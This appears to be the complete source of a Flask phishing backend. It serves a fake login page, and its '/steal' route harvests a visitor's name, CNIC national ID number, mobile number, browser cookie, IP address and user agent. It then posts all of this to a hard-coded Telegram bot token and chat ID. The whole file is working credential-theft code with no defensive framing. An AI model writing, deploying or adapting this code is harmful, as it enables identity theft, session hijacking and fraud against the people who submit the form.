from flask import Flask, request, render_template
import requests
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "7599021313:AAFmH8Ch1-KypyK0Ez2Ot-hYQ8TS7vcGLmE"
CHAT_ID = "6908281054"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": message})

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/steal", methods=["POST"])
def steal():
    name = request.form.get("name")
    cnic = request.form.get("cnic")
    mobile = request.form.get("mobile")
    cookie = request.form.get("cookie")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")

    msg = f"""📥 New Submission:
👤 Name: {name}
🪪 CNIC: {cnic}
📱 Mobile: {mobile}
🌐 IP: {ip}
🧭 UA: {ua}
🍪 Cookie: {cookie}
"""
    send_telegram(msg)
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
